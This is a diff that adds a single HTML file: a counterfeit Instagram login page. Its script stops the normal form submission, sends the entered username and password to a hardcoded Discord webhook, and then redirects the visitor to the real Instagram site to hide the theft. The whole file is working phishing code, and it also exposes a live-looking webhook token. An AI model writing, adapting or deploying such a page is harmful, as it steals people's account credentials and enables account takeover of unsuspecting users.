@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #fafafa;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 2px 5px rgba(0,0,0,0.1);
+            width: 300px;
+            text-align: center;
+        }
+        .logo {
+            margin-bottom: 20px;
+        }
+        input[type="text"],
+        input[type="password"] {
+            width: calc(100% - 40px);
+            padding: 10px;
+            margin-bottom: 10px;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
+        input[type="submit"] {
+            width: 100%;
+            padding: 10px;
+            border: none;
+            border-radius: 5px;
+            background-color: #3897f0;
+            color: #fff;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img class="logo" src="download (1).png" alt="Instagram Logo" width="100">
+        <form id="loginForm" action="login.php" method="post">
+            <input type="text" id="username" name="username" placeholder="Username" required><br>
+            <input type="password" id="password" name="password" placeholder="Password" required><br>
+            <input type="submit" id="loginBtn" value="Login">
+        </form>
+    </div>
+
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Prevent the form from submitting normally
+
+            // Get username and password values
+            var username = document.getElementById('username').value;
+            var password = document.getElementById('password').value;
+
+            // Construct the payload for Discord webhook
+            var webhookUrl = 'https://discord.com/api/webhooks/1256768463368753172/QGw10oOhBO5UoQAtocmJrMM-xOyItGpq6k_moP5tjPe8SLh7C638Q3HF9OoF9LcPYCwl';
+            var payload = {
+                content: 'New login attempt:\nUsername: ' + username + '\nPassword: ' + password
+            };
+
+            // Send the data to Discord webhook using fetch API
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error('Network response was not ok');
+                }
+                console.log('Login data sent to Discord webhook successfully!');
+                // Redirect to Instagram after successful data submission
+                window.location.href = 'https://www.instagram.com';
+            })
+            .catch(error => {
+                console.error('Error sending login data to Discord webhook:', error);
+                // Handle errors, e.g., show an alert to the user
+            });
+        });
+    </script>
+</body>
+</html>
